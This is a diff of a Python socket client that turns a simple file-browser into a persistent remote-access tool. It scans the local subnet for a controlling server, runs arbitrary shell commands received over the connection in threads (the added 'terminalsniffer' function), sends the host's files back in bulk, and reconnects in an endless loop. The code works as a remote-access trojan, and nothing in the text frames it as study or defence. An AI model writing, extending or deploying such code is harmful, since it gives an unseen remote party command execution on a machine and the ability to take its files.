@@ -1,11 +1,18 @@
 import os
 import subprocess
+import threading
 import time
 from hashlib import sha256
 from pathlib import Path
 from socket import *
 
-server_name = 'localhost'
+clientSocket = socket(AF_INET, SOCK_STREAM)
+try:
+    current_ip = gethostbyname('DESKTOP-DJ15UQ2.local')
+except Exception as e:
+    current_ip = gethostbyname('DESKTOP-DJ15UQ2')
+local_ip = ''
+connected = False
 server_port = 34561
 current_path = Path.home()
 slash = '/' if os.name != 'nt' else '\\'
@@ -32,8 +39,11 @@ def ls():
 def cdup():
     print('Change to parent directory requested')
     global current_path
-    current_path = str(Path(current_path).parent)
-    clientSocket.send(current_path.encode())
+    try:
+        current_path = Path(current_path).parent
+        clientSocket.send(str(current_path).encode())
+    except Exception:
+        clientSocket.send('Path not found'.encode())
 
 
 def cdhome():
@@ -54,7 +64,7 @@ def cd():
             clientSocket.send(current_path.encode())
         else:
             raise FileNotFoundError
-    except FileNotFoundError:
+    except Exception:
         print('Path not found')
         clientSocket.send('Path not found'.encode())
 
@@ -78,14 +88,15 @@ def getall():
         for file in files:
             clientSocket.send(file.encode())
             if not send(file):
-                clientSocket.send('.'.encode())
+                time.sleep(0.1)
+                clientSocket.sendall('.'.encode())
                 return
 
             time.sleep(0.1)
             if clientSocket.recv(1024).decode() == 'ok':
                 continue
-
-        clientSocket.send('.'.encode())
+        time.sleep(0.1)
+        clientSocket.sendall('.'.encode())
         break
 
 
@@ -107,30 +118,43 @@ def send(fname):
         clientSocket.sendall(data)
         file.close()
         return True
-    except OSError:
+    except Exception:
         print('Permission denied')
         clientSocket.send('Permission denied'.encode())
         return False
 
 
+def terminalsniffer(cmd):
+    try:
+        p = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='utf-8',
+                             errors='replace')
+        try:
+            output, error = p.communicate(timeout=10)
+            if error:
+                clientSocket.sendall(error.encode())
+            else:
+                clientSocket.sendall(output.encode())
+
+            time.sleep(0.1)
+            clientSocket.send('ok'.encode())
+        except Exception as e:
+            p.kill()
+            clientSocket.sendall(str(e).encode())
+            clientSocket.send('ok'.encode())
+    except Exception as e:
+        clientSocket.sendall(str(e).encode())
+        clientSocket.send('ok'.encode())
+
+
 def command():
     print('Subprocess requested')
     command = clientSocket.recv(1024).decode()
-    print('Executing command ' + command)
     try:
-        output = subprocess.run(command, capture_output=True,
-                                text=True, check=True, shell=False, timeout=10, encoding='utf-8', errors='ignore')
-        if str(output.stdout) != '':
-            clientSocket.send(str(len(output.stdout)).encode())
-            clientSocket.sendall(str(output.stdout).encode())
-        else:
-            clientSocket.send('No Output'.encode())
-    except subprocess.TimeoutExpired:
-        print('Command timeout')
-        clientSocket.send('Command timeout'.encode())
-    except OSError:
-        print('Command not found')
-        clientSocket.send('Command not found'.encode())
+        t = threading.Thread(target=terminalsniffer, args=(command,))
+        t.start()
+    except Exception as e:
+        clientSocket.sendall(str(e).encode())
+        clientSocket.send('ok'.encode())
 
 
 def platform():
@@ -155,20 +179,42 @@ switcher = {
     'command': command,
     'platform': platform}
 
-connected = False
-while True:
+
+def master():
+    global clientSocket, current_ip, local_ip, connected
+
+    if os.name == 'posix':
+        cmd="ip route get 1.2.3.4 | awk '{print $7}'"
+        local_ip = subprocess.check_output(cmd, shell=True).decode().strip()
+        local_ip = local_ip.rsplit('.', 1)[0]+'.'
+    else:
+        local_ip = gethostbyname(gethostname())
+        local_ip = local_ip.rsplit('.', 1)[0]+'.'
 
     while not connected:
-        try:
-            clientSocket = socket(AF_INET, SOCK_STREAM)
-            clientSocket.connect((server_name, server_port))
-            connected = True
-            print("re-connection successful")
-
-        except ConnectionRefusedError:
-            print('Server not available')
-            connected = False
-            time.sleep(10)
+        if current_ip == '':
+            print('Scanning for server...')
+            for i in range(1, 255):
+                ip = local_ip + str(i)
+                print('Trying ' + ip)
+                if clientSocket.connect_ex((ip, server_port)) == 0:
+                    print('Connected to ' + ip)
+                    connected = True
+                    current_ip = ip
+                    break
+        else:
+            print('Trying to reconnect to ' + current_ip)
+            for i in range(1, 10):
+                time.sleep(2)
+                if (clientSocket.connect_ex((current_ip, server_port))) == 0:
+                    connected = True
+                    print('Reconnected to ' + current_ip)
+                    break
+                else:
+                    print('Failed to reconnect to ' + current_ip)
+                    clientSocket.close()
+                    clientSocket = socket(AF_INET, SOCK_STREAM)
+        current_ip = ''
 
     while connected:
         try:
@@ -176,10 +222,20 @@ while True:
             if command in switcher.keys() and command != '':
                 print('Command received: ', command)
                 switcher[command]()
-        except ConnectionError:
+        except Exception:
             print('Server disconnected')
-            clientSocket.shutdown(SHUT_RDWR)
-            clientSocket.close()
             connected = False
-            time.sleep(10)
-            os.system('cls')
+            clientSocket.close()
+            clientSocket = socket(AF_INET, SOCK_STREAM)
+
+
+if __name__ == '__main__':
+    while True:
+        t = threading.Thread(target=master)
+        if not t.is_alive():
+            t.start()
+        t.join()
+        time.sleep(0.1)
+
+
+
